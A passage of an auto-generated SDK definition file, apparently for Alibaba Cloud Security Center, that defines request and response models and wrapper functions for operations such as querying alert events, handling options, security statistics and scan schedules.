  statusCode: int32(name='statusCode'),
  body: DescribeScanTaskStatisticsResponseBody(name='body'),
}

async function describeScanTaskStatisticsWithOptions(request: DescribeScanTaskStatisticsRequest, runtime: Util.RuntimeOptions): DescribeScanTaskStatisticsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.levels)) {
    query['Levels'] = request.levels;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeScanTaskStatistics',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeScanTaskStatistics(request: DescribeScanTaskStatisticsRequest): DescribeScanTaskStatisticsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeScanTaskStatisticsWithOptions(request, runtime);
}

model DescribeSearchConditionRequest {
  lang?: string(name='Lang', description='The language of the content within the request and the response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='117.220.XX.XX'),
  type?: string(name='Type', description='The type of the asset. Valid values:

*   **ecs**: Elastic Compute Service (ECS) instance
*   **cloud_product**: cloud service except ECS', example='ecs'),
}

model DescribeSearchConditionResponseBody = {
  conditionList?: [ 
    {
      conditionType?: string(name='ConditionType', description='The type of the filter condition. Valid values:

*   **system**: default filter condition
*   **user**: custom filter condition', example='system'),
      filterConditions?: string(name='FilterConditions', description='The filter condition. The value of this parameter is in the JSON format and contains the following fields:

*   **filterParams**: the parameters of the filter condition. The value of this field is in the JSON format and contains the following fields:

    *   **labelKey**: the key for rendering.

    *   **label**: the display name.

    *   **value**: the value of the filter condition. The value of this field is in the JSON format and contains the following fields:

        *   **name**: the name of the filter item.
        *   **value**: the value of the filter item.

*   **LogicalExp**: the logical relationship among the filter conditions. Valid values:

    *   **AND**: The filter conditions are evaluated by using a logical **AND**.
    *   **OR**: The filter conditions are evaluated by using a logical **OR**.

>  If the value of **ConditionType** is **system**, **labelKey** is returned. The labelKey field is used only for internationalization rendering.', example='{\\"filterParams\\":[{\\"labelKey\\":\\"a|b\\",\\"value\\":\\"{\\\\\\"name\\\\\\":\\\\\\"sadsasd\\\\\\",\\\\\\"value\\\\\\":\\\\\\"dasdsdas\\\\\\"}\\"}],\\"LogicalExp\\":\\"OR\\"}'),
      name?: string(name='Name', description='The name of the filter condition.', example='StopMachine'),
      nameKey?: string(name='NameKey', description='The key of the filter condition name.', example='stop_machine'),
    }
  ](name='ConditionList', description='An array that consists of the filter conditions.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='3AEC47AF-8CFA-485E-AC9A-3A8ABC06EA7F'),
}

model DescribeSearchConditionResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeSearchConditionResponseBody(name='body'),
}

async function describeSearchConditionWithOptions(request: DescribeSearchConditionRequest, runtime: Util.RuntimeOptions): DescribeSearchConditionResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeSearchCondition',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeSearchCondition(request: DescribeSearchConditionRequest): DescribeSearchConditionResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeSearchConditionWithOptions(request, runtime);
}

model DescribeSecureSuggestionRequest {
  lang?: string(name='Lang'),
  sourceIp?: string(name='SourceIp'),
}

model DescribeSecureSuggestionResponseBody = {
  requestId?: string(name='RequestId'),
  suggestions?: [ 
    {
      detail?: [ 
        {
          description?: string(name='Description'),
          subType?: string(name='SubType'),
          title?: string(name='Title'),
        }
      ](name='Detail'),
      points?: int32(name='Points'),
      suggestType?: string(name='SuggestType'),
    }
  ](name='Suggestions'),
  totalCount?: int32(name='TotalCount'),
}

model DescribeSecureSuggestionResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeSecureSuggestionResponseBody(name='body'),
}

async function describeSecureSuggestionWithOptions(request: DescribeSecureSuggestionRequest, runtime: Util.RuntimeOptions): DescribeSecureSuggestionResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeSecureSuggestion',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeSecureSuggestion(request: DescribeSecureSuggestionRequest): DescribeSecureSuggestionResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeSecureSuggestionWithOptions(request, runtime);
}

model DescribeSecurityCheckScheduleConfigRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='1.2.XX.XX'),
}

model DescribeSecurityCheckScheduleConfigResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='48D2E9A9-A1B0-4295-B727-0995757C47E9'),
  riskCheckJobConfig?: {
    daysOfWeek?: string(name='DaysOfWeek', description='The day of the week when the check tasks are performed. Multiple days can be specified. Multiple days are separated by commas (,).

*   **1**: Monday
*   **2**: Tuesday
*   **3**: Wednesday
*   **4**: Thursday
*   **5**: Friday
*   **6**: Saturday
*   **7**: Sunday', example='1,2,3'),
    endTime?: int32(name='EndTime', description='The time range during which check tasks end. Valid values:

*   **6**: 00:00 to 06:00
*   **12**: 06:00 to 12:00
*   **18**: 12:00 to 18:00
*   **24**: 18:00 to 24:00', example='12'),
    startTime?: int32(name='StartTime', description='The time range during which check tasks start. Valid values:

*   **0**: 00:00 to 06:00
*   **6**: 06:00 to 12:00
*   **12**: 12:00 to 18:00
*   **18**: 18:00 to 24:00', example='6'),
  }(name='RiskCheckJobConfig', description='The configurations of custom check tasks.'),
}

model DescribeSecurityCheckScheduleConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeSecurityCheckScheduleConfigResponseBody(name='body'),
}

/**
  * @deprecated
  *
  * @param request DescribeSecurityCheckScheduleConfigRequest
  * @param runtime runtime options for this request RuntimeOptions
  * @return DescribeSecurityCheckScheduleConfigResponse
 */
// Deprecated
async function describeSecurityCheckScheduleConfigWithOptions(request: DescribeSecurityCheckScheduleConfigRequest, runtime: Util.RuntimeOptions): DescribeSecurityCheckScheduleConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeSecurityCheckScheduleConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

/**
  * @deprecated
  *
  * @param request DescribeSecurityCheckScheduleConfigRequest
  * @return DescribeSecurityCheckScheduleConfigResponse
 */
// Deprecated
async function describeSecurityCheckScheduleConfig(request: DescribeSecurityCheckScheduleConfigRequest): DescribeSecurityCheckScheduleConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeSecurityCheckScheduleConfigWithOptions(request, runtime);
}

model DescribeSecurityEventOperationStatusRequest {
  resourceOwnerId?: long(name='ResourceOwnerId'),
  securityEventIds?: [ string ](name='SecurityEventIds', description='The IDs of the alert events.

>  You must specify at least one of the TaskId and SecurityEventIds parameters.', example='["909361"]'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='192.168.XX.XX'),
  taskId?: long(name='TaskId', description='The ID of the task that handles the alert events.

>  You must specify at least one of the TaskId and SecurityEventIds parameters.', example='12121'),
}

model DescribeSecurityEventOperationStatusResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='1683940A-E4AE-4473-8C40-F4075434B76B'),
  securityEventOperationStatusResponse?: {
    securityEventOperationStatuses?: [ 
      {
        errorCode?: string(name='ErrorCode', description='The code that indicates the handling result of the alert event.', example='ignore.Success'),
        securityEventId?: string(name='SecurityEventId', description='The ID of the alert event.', example='12321'),
        status?: string(name='Status', description='The handling status of the alert event. Valid values:

*   **Processing**: The alert event is being handled.
*   **Success**: The alert event is handled.
*   **Failed**: The alert event failed to be handled.', example='Success'),
      }
    ](name='SecurityEventOperationStatuses', description='An array consisting of the status of the alert events handled by the task.'),
    taskStatus?: string(name='TaskStatus', description='The status of the task that handles the alert events. Valid values:

*   **Processing**: The task is running.
*   **Success**: The task is successful.
*   **Failure**: The task failed.
*   **Pending**: The task is pending.', example='Success'),
  }(name='SecurityEventOperationStatusResponse', description='The information about the task that handles the alert events.'),
}

model DescribeSecurityEventOperationStatusResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeSecurityEventOperationStatusResponseBody(name='body'),
}

async function describeSecurityEventOperationStatusWithOptions(request: DescribeSecurityEventOperationStatusRequest, runtime: Util.RuntimeOptions): DescribeSecurityEventOperationStatusResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.securityEventIds)) {
    query['SecurityEventIds'] = request.securityEventIds;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.taskId)) {
    query['TaskId'] = request.taskId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeSecurityEventOperationStatus',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeSecurityEventOperationStatus(request: DescribeSecurityEventOperationStatusRequest): DescribeSecurityEventOperationStatusResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeSecurityEventOperationStatusWithOptions(request, runtime);
}

model DescribeSecurityEventOperationsRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  securityEventId?: long(name='SecurityEventId', description='The ID of the alert event that you want to handle.', example='61352054'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='192.168.XX.XX'),
}

model DescribeSecurityEventOperationsResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='B7A2000F-497E-5DA0-B14D-615CD410DD7E'),
  securityEventOperationsResponse?: [ 
    {
      markField?: [ 
        {
          filedAliasName?: string(name='FiledAliasName', description='The alias of the field that is used in the whitelist rule.', example='file path'),
          filedName?: string(name='FiledName', description='The field that is used in the whitelist rule.', example='gmtModified'),
          markMisType?: string(name='MarkMisType', description='The operation that is used in the whitelist rule. Valid values:

*   **contains**: contains
*   **notContains**: does not contain
*   **regex**: regular expression
*   **strEqual**: equals
*   **strNotEqual**: does not equal', example='contains'),
          markMisValue?: string(name='MarkMisValue', description='The value of the field that is used in the whitelist rule.', example='2022-04-25 10:11:04'),
          supportedMisType?: [ string ](name='SupportedMisType', description='An array consisting of the operations that are supported by the method to add the alert event to the whitelist.'),
          uuid?: string(name='Uuid', description='The UUID of the server on which the alert event is detected.', example='3d6b4a75-c28f-447b-9142-38f6252c****'),
        }
      ](name='MarkField', description='An array consisting of the configuration information that is used when the value of the OperationCode parameter is **advance\\_mark\\_mis_info**.'),
      markFieldsSource?: [ 
        {
          filedAliasName?: string(name='FiledAliasName', description='The alias of the field that can be used in the whitelist rule.', example='file path'),
          filedName?: string(name='FiledName', description='The field that can be used in the whitelist rule.', example='gmtModified'),
          markMisValue?: string(name='MarkMisValue', description='The value of the field that can be used in the whitelist rule.', example='contains'),
          supportedMisType?: [ string ](name='SupportedMisType', description='An array consisting of the operations that are supported by the method to add the alert event to the whitelist.'),
        }
      ](name='MarkFieldsSource', description='An array consisting of the configuration items that can be used when the value of the OperationCode parameter is advance_mark_mis_info.'),
      operationCode?: string(name='OperationCode', description='The operation that you can perform to handle the alert. Valid values:

*   **block_ip**: blocks the source IP address.
*   **advance\\_mark\\_mis_info**: adds the alert to the whitelist.
*   **ignore**: ignores the alert.
*   **manual_handled**: marks the alert as manually handled.
*   **kill_process**: terminates the malicious process.
*   **cleanup**: performs in-depth virus detection and removal.
*   **kill\\_and_quara**: terminates the malicious process and quarantines the source file.
*   **disable\\_malicious_defense**: stops the container on which the alerting files or processes exist.
*   **client\\_problem_check**: performs troubleshooting.
*   **quara**: quarantines the source file of the malicious process.', example='advance_mark_mis_info'),
      operationParams?: string(name='OperationParams', description='The configuration of the operation that you can perform to handle the alert event.

>  If the value of the OperationCode parameter is `kill_and_quara` or `block_ip`, the OperationParams parameter is required. If the value of the OperationCode parameter is a different value, the OperationParams parameter can be left empty.', example='{"expireTime":1641566807783}'),
      userCanOperate?: boolean(name='UserCanOperate', description='Indicates whether you can handle the alert event in the current edition of Security Center. Valid values:

*   **true**: yes
*   **false**: no', example='false'),
    }
  ](name='SecurityEventOperationsResponse', description='An array consisting of the operations that you can perform to handle the alert event.'),
}

model DescribeSecurityEventOperationsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeSecurityEventOperationsResponseBody(name='body'),
}

async function describeSecurityEventOperationsWithOptions(request: DescribeSecurityEventOperationsRequest, runtime: Util.RuntimeOptions): DescribeSecurityEventOperationsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.securityEventId)) {
    query['SecurityEventId'] = request.securityEventId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeSecurityEventOperations',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeSecurityEventOperations(request: DescribeSecurityEventOperationsRequest): DescribeSecurityEventOperationsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeSecurityEventOperationsWithOptions(request, runtime);
}

model DescribeSecurityStatInfoRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  resourceDirectoryAccountId?: string(name='ResourceDirectoryAccountId', description='The ID of the account that is added to the resource directory as a member for multi-account control. You can use this parameter to query the security status of the account.', example='12345'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='1.2.XX.XX'),
}

model DescribeSecurityStatInfoResponseBody = {
  attackEvent?: {
    dateArray?: [ string ](name='DateArray', description='The points in time when the number of attacks is collected in the trend chart.'),
    totalCount?: int32(name='TotalCount', description='The total number of attacks on the current day.', example='1096'),
    valueArray?: [ string ](name='ValueArray', description='The numbers of attacks at all points in time.'),
  }(name='AttackEvent', description='The detailed statistics of attacks.'),
  healthCheck?: {
    dateArray?: [ string ](name='DateArray', description='The points in time when data of baseline risk items is collected in the trend chart.'),
    highCount?: int32(name='HighCount', description='The number of baseline risk items that have the high-risk level on the current day.', example='10'),
    highList?: [ string ](name='HighList', description='The numbers of baseline risk items that have the high-risk level at all points in time.'),
    levelsOn?: [ string ](name='LevelsOn', description='The risk levels of baseline risk items.'),
    lowCount?: int32(name='LowCount', description='The number of baseline risk items that have the low-risk level on the current day.', example='0'),
    lowList?: [ string ](name='LowList', description='The numbers of baseline risk items that have the low-risk level at all points in time.'),
    mediumCount?: int32(name='MediumCount', description='The number of baseline risk items that have the medium-risk level on the current day.', example='21'),
    mediumList?: [ string ](name='MediumList', description='The numbers of baseline risk items that have the medium-risk level at all points in time.'),
    timeArray?: [ string ](name='TimeArray', description='The time periods during which data of baseline risk items is collected.'),
    totalCount?: int32(name='TotalCount', description='The total number of baseline risk items on the current day.', example='32'),
    valueArray?: [ string ](name='ValueArray', description='The total number of baseline risk items at all points in time.'),
  }(name='HealthCheck', description='The detailed statistics of baseline risk items.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='A3E61730-85E2-4789-8017-B9B1B70F0568'),
  securityEvent?: {
    dateArray?: [ string ](name='DateArray', description='The points in time when data of unhandled alerts is collected in the trend chart.'),
    levelsOn?: [ string ](name='LevelsOn', description='The risk levels of unhandled alerts.'),
    remindCount?: int32(name='RemindCount', description='The number of **remind** alerts on the current day.', example='0'),
    remindList?: [ string ](name='RemindList', description='The numbers of remind alerts at all points in time.'),
    seriousCount?: int32(name='SeriousCount', description='The number of **serious** alerts on the current day.', example='404'),
    seriousList?: [ string ](name='SeriousList', description='The numbers of serious alerts at all points in time.'),
    suspiciousCount?: int32(name='SuspiciousCount', description='The number of **suspicious** alerts on the current day.', example='148'),
    suspiciousList?: [ string ](name='SuspiciousList', description='The numbers of suspicious alerts at all points in time.'),
    timeArray?: [ string ](name='TimeArray', description='The time periods during which data of the same alert is collected.'),
    totalCount?: int32(name='TotalCount', description='The total number of unhandled alerts on the current day.', example='552'),
    valueArray?: [ string ](name='ValueArray', description='The numbers of unhandled alerts at all points in time.'),
  }(name='SecurityEvent', description='The detailed statistics of unhandled alerts.'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
  vulnerability?: {
    asapCount?: int32(name='AsapCount', description='The number of **high-risk** unfixed vulnerabilities on the current day.', example='109'),
    asapList?: [ string ](name='AsapList', description='The numbers of high-risk unfixed vulnerabilities at all points in time.'),
    dateArray?: [ string ](name='DateArray', description='The points in time when data of unfixed vulnerabilities is collected in the trend chart.'),
    laterCount?: int32(name='LaterCount', description='The number of **medium-risk** unfixed vulnerabilities on the current day.', example='275'),
    laterList?: [ string ](name='LaterList', description='The numbers of medium-risk unfixed vulnerabilities at all points in time.'),
    levelsOn?: [ string ](name='LevelsOn', description='The risk levels of unfixed vulnerabilities.'),
    nntfCount?: int32(name='NntfCount', description='The number of **low-risk** unfixed vulnerabilities on the current day.', example='0'),
    nntfList?: [ string ](name='NntfList', description='The numbers of low-risk unfixed vulnerabilities at all points in time.'),
    timeArray?: [ string ](name='TimeArray', description='The time periods during which data of unfixed vulnerabilities is collected.'),
    totalCount?: int32(name='TotalCount', description='The total number of unfixed vulnerabilities on the current day.', example='384'),
    valueArray?: [ string ](name='ValueArray', description='The numbers of unfixed vulnerabilities at all points in time.'),
  }(name='Vulnerability', description='The detailed statistics of unfixed vulnerabilities.'),
}

model DescribeSecurityStatInfoResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeSecurityStatInfoResponseBody(name='body'),
}

async function describeSecurityStatInfoWithOptions(request: DescribeSecurityStatInfoRequest, runtime: Util.RuntimeOptions): DescribeSecurityStatInfoResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.resourceDirectoryAccountId)) {
    query['ResourceDirectoryAccountId'] = request.resourceDirectoryAccountId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeSecurityStatInfo',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeSecurityStatInfo(request: DescribeSecurityStatInfoRequest): DescribeSecurityStatInfoResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeSecurityStatInfoWithOptions(request, runtime);
}

model DescribeServiceLinkedRoleStatusRequest {
  serviceLinkedRole?: string(name='ServiceLinkedRole', description='The service-linked role. Default value: **AliyunServiceRoleForSas**. Valid values:

*   **AliyunServiceRoleForSas**: the service-linked role of Security Center. Security Center assumes this role to access the resources of other cloud services within your account.
*   **AliyunServiceRoleForSasCspm**: the service-linked role of Security Center-CSPM. Security Center-CSPM assumes this role to access the resources of other cloud services within your account.', example='AliyunServiceRoleForSas'),
}

model DescribeServiceLinkedRoleStatusResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='39CE98F4-88C0-4539-B906-6B542E5C07B9'),
  roleStatus?: {
    status?: boolean(name='Status', description='Indicates whether the service-linked role is created. Valid values:

*   **true**: yes
*   **false**: no', example='true'),
  }(name='RoleStatus', description='The status information about the service-linked role.'),
}

model DescribeServiceLinkedRoleStatusResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeServiceLinkedRoleStatusResponseBody(name='body'),
}

async function describeServiceLinkedRoleStatusWithOptions(request: DescribeServiceLinkedRoleStatusRequest, runtime: Util.RuntimeOptions): DescribeServiceLinkedRoleStatusResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.serviceLinkedRole)) {
    query['ServiceLinkedRole'] = request.serviceLinkedRole;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeServiceLinkedRoleStatus',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeServiceLinkedRoleStatus(request: DescribeServiceLinkedRoleStatusRequest): DescribeServiceLinkedRoleStatusResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeServiceLinkedRoleStatusWithOptions(request, runtime);
}

model DescribeSimilarEventScenariosRequest {
  resourceOwnerId?: long(name='ResourceOwnerId'),
  securityEventId?: long(name='SecurityEventId', description='The ID of the alert to query.', example='12321'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='1.2.XX.XX'),
}

model DescribeSimilarEventScenariosResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='FDF7B8D9-8493-4B90-8D13-E0C1FFCE5F97'),
  scenarios?: [ 
    {
      code?: string(name='Code', description='The code of the scenario. Valid values: Valid values:
- **default**: the same alert type
- **same_file_content**: the same file content rule
- **same_ip**: the same IP address rule
- **same_url**: the same URL rule', example='same_url'),
    }
  ](name='Scenarios', description='The scenarios in which you can handle the alerts triggered by the same rule or rules of the same type.'),
}

model DescribeSimilarEventScenariosResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeSimilarEventScenariosResponseBody(name='body'),
}

async function describeSimilarEventScenariosWithOptions(request: DescribeSimilarEventScenariosRequest, runtime: Util.RuntimeOptions): DescribeSimilarEventScenariosResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.securityEventId)) {
    query['SecurityEventId'] = request.securityEventId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeSimilarEventScenarios',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeSimilarEventScenarios(request: DescribeSimilarEventScenariosRequest): DescribeSimilarEventScenariosResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeSimilarEventScenariosWithOptions(request, runtime);
}

model DescribeSimilarSecurityEventsRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: **20**.', example='20'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='1.2.XX.XX'),
  taskId?: long(name='TaskId', description='The ID of the task. You can call the [CreateSimilarSecurityEventsQueryTask](~~CreateSimilarSecurityEventsQueryTask~~) operation to query the IDs of tasks.', example='1689135'),
}

model DescribeSimilarSecurityEventsResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='5'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: **20**.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='5'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='9F4217C8-763F-51EF-84D4-5535E072B2D8'),
  securityEventsResponse?: [ 
    {
      eventName?: string(name='EventName', description='The name of the alert event.', example='Trojan'),
      eventType?: string(name='EventType', description='The alert type of the alert event. Valid values:

*   Suspicious process
*   Webshell
*   Unusual logon
*   Exception
*   Sensitive file tampering
*   Malicious process (cloud threat detection)
*   Suspicious network connection
*   Other
*   Abnormal account
*   Application intrusion event
*   Cloud threat detection
*   Precise defense
*   Application whitelist
*   Persistent webshell
*   Web application threat detection
*   Malicious script
*   Threat intelligence
*   Malicious network activity
*   Cluster exception
*   Webshell (on-premises threat detection)
*   Vulnerability exploitation
*   Malicious process (on-premises threat detection)
*   Trusted exception

For more information about alert types, see [Alerts](~~191144~~).', example='Malicious Software'),
      lastTime?: long(name='LastTime', description='The timestamp when the alert event was last detected. Unit: milliseconds.', example='1648544361480'),
      occurrenceTime?: long(name='OccurrenceTime', description='The timestamp when the alert event was first detected. Unit: milliseconds.', example='1648457961000'),
      securityEventId?: long(name='SecurityEventId', description='The ID of the alert event.', example='158661'),
      uuid?: string(name='Uuid', description='The UUID of the server that is affected by the alert event.', example='qweeqq-13232-daweq-w****'),
    }
  ](name='SecurityEventsResponse', description='An array consisting of the alert events that are triggered by the same rule or of the same alert type.'),
}

model DescribeSimilarSecurityEventsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeSimilarSecurityEventsResponseBody(name='body'),
}

async function describeSimilarSecurityEventsWithOptions(request: DescribeSimilarSecurityEventsRequest, runtime: Util.RuntimeOptions): DescribeSimilarSecurityEventsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.taskId)) {
    query['TaskId'] = request.taskId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeSimilarSecurityEvents',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeSimilarSecurityEvents(request: DescribeSimilarSecurityEventsRequest): DescribeSimilarSecurityEventsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeSimilarSecurityEventsWithOptions(request, runtime);
}

model DescribeSnapshotsRequest {
  apiVersion?: string(name='ApiVersion'),
  currentPage?: int32(name='CurrentPage'),
  isAliYunEcs?: string(name='IsAliYunEcs'),
  machineRegion?: string(name='MachineRegion'),
  machineRemark?: string(name='MachineRemark'),
  nextToken?: string(name='NextToken'),
  pageSize?: int32(name='PageSize'),
  statusList?: string(name='StatusList'),
